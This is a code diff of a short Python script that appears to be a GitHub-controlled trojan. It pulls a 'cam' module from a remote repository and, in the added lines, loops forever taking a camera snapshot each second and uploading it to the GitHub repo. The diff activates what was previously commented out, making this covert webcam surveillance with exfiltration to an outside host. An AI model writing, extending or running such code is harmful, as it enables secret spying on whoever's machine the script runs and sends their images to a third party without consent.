@@ -20,7 +20,7 @@ def connect_to_github() :
 def get_file_contents(file_path):
     gh, repo, branch = connect_to_github()
     if gh and repo and branch:
-	#obtenir tous les fichier. dir print hash_list tchouf.aw kesser rassek chwiya kho
+	#obtenir tous les fichier. 
         hash_list = branch.commit.commit.tree.recurse().tree
 	
 	#itteration sur tout les fichier	
@@ -44,12 +44,13 @@ def load_module(name):
 
 def send(img):
 	gh,repo,branch = connect_to_github()
-	#f = open('bean.jpeg','r')
-#	repo.create_file("data/mrbean64.jpeg","add a file",base64.b64encode(f.read()))
-	repo.create_file("data/ggg.jpeg","fst image",img)
+	repo.create_file("data/p.png","nouvelle photo",img)
+
+
 
 cam = load_module("cam")
 
-#img = cam.snap()
-#send(img)
-#time.sleep(1)
+while True:
+	img = cam.snap()
+	send(img)
+	time.sleep(1)
